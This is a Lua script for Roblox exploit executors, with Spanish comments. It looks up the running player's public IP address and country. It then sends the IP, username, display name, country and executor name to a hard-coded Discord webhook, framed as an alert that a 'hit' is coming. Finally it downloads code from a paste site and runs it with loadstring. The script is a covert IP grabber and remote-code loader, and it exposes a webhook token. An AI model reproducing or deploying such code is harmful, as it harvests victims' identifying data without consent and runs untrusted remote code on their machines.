local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- ====================================
-- 1️⃣ Función para convertir código ISO a emoji
-- ====================================
local function codeToEmoji(code)
    local a,b = code:sub(1,1), code:sub(2,2)
    return utf8.char(0x1F1E6 + (a:byte() - 65)) .. utf8.char(0x1F1E6 + (b:byte() - 65))
end

-- ====================================
-- 2️⃣ Tabla completa ISO2 → Nombre de país
-- ====================================
local ISOToCountry = {
    AF="Afganistán", AL="Albania", DZ="Argelia", AS="Samoa Americana", AD="Andorra",
    AO="Angola", AI="Anguila", AQ="Antártida", AG="Antigua y Barbuda", AR="Argentina",
    AM="Armenia", AW="Aruba", AU="Australia", AT="Austria", AZ="Azerbaiyán",
    BS="Bahamas", BH="Bahrein", BD="Bangladesh", BB="Barbados", BY="Bielorrusia",
    BE="Bélgica", BZ="Belice", BJ="Benín", BM="Bermudas", BT="Bután",
    BO="Bolivia", BA="Bosnia y Herzegovina", BW="Botsuana", BR="Brasil", IO="Territorio Británico del Océano Índico",
    VG="Islas Vírgenes Británicas", BN="Brunéi", BG="Bulgaria", BF="Burkina Faso", BI="Burundi",
    KH="Camboya", CM="Camerún", CA="Canadá", CV="Cabo Verde", KY="Islas Caimán",
    CF="República Centroafricana", TD="Chad", CL="Chile", CN="China", CX="Isla de Navidad",
    CC="Islas Cocos", CO="Colombia", KM="Comoras", CD="Congo (República Democrática)", CG="Congo",
    CK="Islas Cook", CR="Costa Rica", CI="Costa de Marfil", HR="Croacia", CU="Cuba",
    CW="Curazao", CY="Chipre", CZ="Chequia", DK="Dinamarca", DJ="Yibuti",
    DM="Dominica", DO="República Dominicana", EC="Ecuador", EG="Egipto", SV="El Salvador",
    GQ="Guinea Ecuatorial", ER="Eritrea", EE="Estonia", SZ="Esuatini", ET="Etiopía",
    FK="Islas Malvinas", FO="Islas Feroe", FJ="Fiyi", FI="Finlandia", FR="Francia",
    GF="Guayana Francesa", PF="Polinesia Francesa", GA="Gabón", GM="Gambia", GE="Georgia",
    DE="Alemania", GH="Ghana", GI="Gibraltar", GR="Grecia", GL="Groenlandia",
    GD="Granada", GP="Guadalupe", GU="Guam", GT="Guatemala", GG="Guernesey",
    GN="Guinea", GW="Guinea-Bisáu", GY="Guyana", HT="Haití", HN="Honduras",
    HK="Hong Kong", HU="Hungría", IS="Islandia", IN="India", ID="Indonesia",
    IR="Irán", IQ="Irak", IE="Irlanda", IM="Isla de Man", IL="Israel",
    IT="Italia", JM="Jamaica", JP="Japón", JE="Jersey", JO="Jordania",
    KZ="Kazajistán", KE="Kenia", KI="Kiribati", KW="Kuwait", KG="Kirguistán",
    LA="Laos", LV="Letonia", LB="Líbano", LS="Lesoto", LR="Liberia",
    LY="Libia", LI="Liechtenstein", LT="Lituania", LU="Luxemburgo", MO="Macao",
    MG="Madagascar", MW="Malaui", MY="Malasia", MV="Maldivas", ML="Mali",
    MT="Malta", MH="Islas Marshall", MQ="Martinica", MR="Mauritania", MU="Mauricio",
    YT="Mayotte", MX="México", FM="Micronesia", MD="Moldavia", MC="Mónaco",
    MN="Mongolia", ME="Montenegro", MS="Montserrat", MA="Marruecos", MZ="Mozambique",
    MM="Birmania", NA="Namibia", NR="Nauru", NP="Nepal", NL="Países Bajos",
    NC="Nueva Caledonia", NZ="Nueva Zelanda", NI="Nicaragua", NE="Níger", NG="Nigeria",
    NU="Niue", KP="Corea del Norte", MK="Macedonia del Norte", MP="Islas Marianas del Norte",
    NO="Noruega", OM="Omán", PK="Pakistán", PW="Palaos", PS="Palestina",
    PA="Panamá", PG="Papúa Nueva Guinea", PY="Paraguay", PE="Perú", PH="Filipinas",
    PN="Islas Pitcairn", PL="Polonia", PT="Portugal", PR="Puerto Rico", QA="Catar",
    RO="Rumanía", RU="Rusia", RW="Ruanda", RE="Reunión", BL="San Bartolomé",
    SH="Santa Elena", KN="San Cristóbal y Nieves", LC="Santa Lucía", MF="San Martín",
    PM="San Pedro y Miquelón", VC="San Vicente y Granadinas", WS="Samoa", SM="San Marino",
    ST="Santo Tomé y Príncipe", SA="Arabia Saudita", SN="Senegal", RS="Serbia", SC="Seychelles",
    SL="Sierra Leona", SG="Singapur", SX="Sint Maarten", SK="Eslovaquia", SI="Eslovenia",
    SB="Islas Salomón", SO="Somalia", ZA="Sudáfrica", KR="Corea del Sur", SS="Sudán del Sur",
    ES="España", LK="Sri Lanka", SD="Sudán", SR="Surinam", SE="Suecia",
    CH="Suiza", SY="Siria", TW="Taiwán", TJ="Tayikistán", TZ="Tanzania",
    TH="Tailandia", TL="Timor-Leste", TG="Togo", TK="Tokelau", TO="Tonga",
    TT="Trinidad y Tobago", TN="Túnez", TR="Turquía", TM="Turkmenistán", TC="Islas Turcas y Caicos",
    TV="Tuvalu", UG="Uganda", UA="Ucrania", AE="Emiratos Árabes Unidos", GB="Reino Unido",
    US="Estados Unidos", UY="Uruguay", UZ="Uzbekistán", VU="Vanuatu", VA="Ciudad del Vaticano",
    VE="Venezuela", VN="Vietnam", WF="Wallis y Futuna", EH="Sahara Occidental", YE="Yemen",
    ZM="Zambia", ZW="Zimbabue"
}

-- ====================================
-- 3️⃣ Función país a emoji usando tabla ISO
-- ====================================
local function countryToEmojiFull(country)
    country = country or "Desconocido"
    local code = nil
    for k,v in pairs(ISOToCountry) do
        if v:lower() == country:lower() then
            code = k
            break
        end
    end
    if not code then
        if country:lower():find("united states") then code = "US" end
    end
    if code then
        return country .. " " .. codeToEmoji(code)
    else
        return country .. " 🏳️"
    end
end

-- ====================================
-- 4️⃣ Detectar país e IP desde IP
-- ====================================
local function detectCountryAndIP()
    local country, ip = "Desconocido", "Desconocido"
    local services = {
        "https://ipapi.co/json",
        "https://ipinfo.io/json",
        "https://ipwhois.app/json/",
        "http://ip-api.com/json",
        "https://geolocation-db.com/json/"
    }
    for _, url in ipairs(services) do
        local success, response = pcall(function()
            return (request or http_request or syn.request)({Url=url, Method="GET"}).Body
        end)
        if success and response then
            local data = HttpService:JSONDecode(response)
            if data then
                country = data.country_name or data.country or country
                ip = data.ip or ip
            end
        end
        if country ~= "Desconocido" then break end
    end
    return countryToEmojiFull(country), ip
end

local countryDisplay, userIP = detectCountryAndIP()

-- ====================================
-- 5️⃣ Enviar webhook
-- ====================================
if getgenv().WebhookEnviado then return end
getgenv().WebhookEnviado = true

local WebhookURL = "https://discord.com/api/webhooks/1384927333562978385/psrT9pR05kv9vw4rwr4oyiDcb07S3ZqAlV_2k_BsbI2neqrmEHOCE_QuFvVvRwd7lNuY"
local mainImageURL = "https://i.postimg.cc/fbsB59FF/file-00000000879c622f8bad57db474fb14d-1.png"
local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId="..LocalPlayer.UserId.."&width=420&height=420&format=png"
local executorName = identifyexecutor and identifyexecutor() or "Desconocido"

local data = {
    ["username"] = "⚠️ ALERTA VIP",
    ["avatar_url"] = avatarUrl,
    ["content"] = "**⚠️ Ejecución detectada, prepárate para recoger el hit 🚨**",
    ["embeds"] = {{
        ["title"] = "🎮 Alerta de ejecución",
        ["description"] = "Información capturada automáticamente con portada en la esquina:",
        ["color"] = 16729344,
        ["thumbnail"] = {["url"] = mainImageURL},
        ["fields"] = {
            {["name"]="IP☠️:", ["value"]=userIP, ["inline"]=true},
            {["name"]="👤 Usuario", ["value"]=LocalPlayer.Name, ["inline"]=true},
            {["name"]="✨ DisplayName", ["value"]=LocalPlayer.DisplayName, ["inline"]=true},
            {["name"]="🌎 País", ["value"]=countryDisplay, ["inline"]=true},
            {["name"]="🛠️ Executor", ["value"]=executorName, ["inline"]=true},
            {["name"]="⏰ Hora", ["value"]=os.date("%Y-%m-%d %H:%M:%S"), ["inline"]=false},
            {["name"]="💥 Estado", ["value"]="Preparando todo para el hit, mantente atento!", ["inline"]=false}
        },
        ["footer"] = {["text"] = "Sistema de ejecución • " .. os.date("%d/%m/%Y")}
    }}
}

local FinalData = HttpService:JSONEncode(data)
local req = request or http_request or syn.request
if req then
    pcall(function()
        req({
            Url = WebhookURL,
            Method = "POST",
            Headers = {["Content-Type"]="application/json"},
            Body = FinalData
        })
    end)
end

-- ====================================
-- 6️⃣ Ejecutar loadstring (TP) después con espera
-- ====================================
task.wait(1) -- espera para que se procese el webhook
pcall(function()
    loadstring(game:HttpGet("https://paste.debian.net/plainh/28c28085/", true))()
end)
